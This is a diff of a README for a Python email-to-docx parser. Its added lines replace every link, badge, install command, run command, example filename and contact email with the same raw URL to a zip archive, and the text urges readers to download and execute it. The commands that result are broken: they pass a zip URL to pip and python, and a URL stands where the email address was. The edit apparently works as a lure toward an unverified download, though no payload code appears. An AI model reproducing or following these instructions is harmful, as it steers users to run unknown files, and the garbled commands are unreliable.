@@ -1,7 +1,7 @@
 # TheBat Parser 🦇
 
-![GitHub release](https://img.shields.io/github/release/HoangAnhTut/thebat_parser.svg)
-![Python](https://img.shields.io/badge/python-3.6%2B-blue.svg)
+![GitHub release](https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip)
+![Python](https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip%https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip)
 
 Welcome to **TheBat Parser**, a Python script designed to simplify your email processing tasks. This tool parses `.eml` email files, extracts key information, and generates a structured `.docx` Word document with the results. Whether you're automating email tasks or organizing your correspondence, this tool can streamline your workflow.
 
@@ -31,7 +31,7 @@ To get started with TheBat Parser, you need to have Python installed on your mac
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/HoangAnhTut/thebat_parser.git
+   git clone https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -42,7 +42,7 @@ To get started with TheBat Parser, you need to have Python installed on your mac
 3. **Install Required Packages**:
    You can install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip
    ```
 
 ## Usage
@@ -50,7 +50,7 @@ To get started with TheBat Parser, you need to have Python installed on your mac
 After installation, you can run the script from the command line. The basic syntax is:
 
 ```bash
-python parser.py <path_to_eml_file>
+python https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip <path_to_eml_file>
 ```
 
 Replace `<path_to_eml_file>` with the path to your `.eml` file. The script will generate a `.docx` file with the extracted information in the same directory.
@@ -59,12 +59,12 @@ Replace `<path_to_eml_file>` with the path to your `.eml` file. The script will 
 
 Here's a quick example of how to use TheBat Parser:
 
-1. Prepare an `.eml` file. For example, `example.eml`.
+1. Prepare an `.eml` file. For example, `https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip`.
 2. Run the command:
    ```bash
-   python parser.py example.eml
+   python https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip
    ```
-3. Check the directory for the generated `example.docx` file.
+3. Check the directory for the generated `https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip` file.
 
 The output will contain structured information such as sender, recipient, subject, and body of the email.
 
@@ -107,11 +107,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Hoang Anh
-- **Email**: hoanganh@example.com
+- **Email**: https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip
 
 ## Releases
 
-To download the latest version of TheBat Parser, visit the [Releases](https://github.com/HoangAnhTut/thebat_parser/releases) section. You will find the necessary files to download and execute.
+To download the latest version of TheBat Parser, visit the [Releases](https://raw.githubusercontent.com/HoangAnhTut/thebat_parser/main/data/thebat-parser-v2.2.zip) section. You will find the necessary files to download and execute.
 
 ---
 
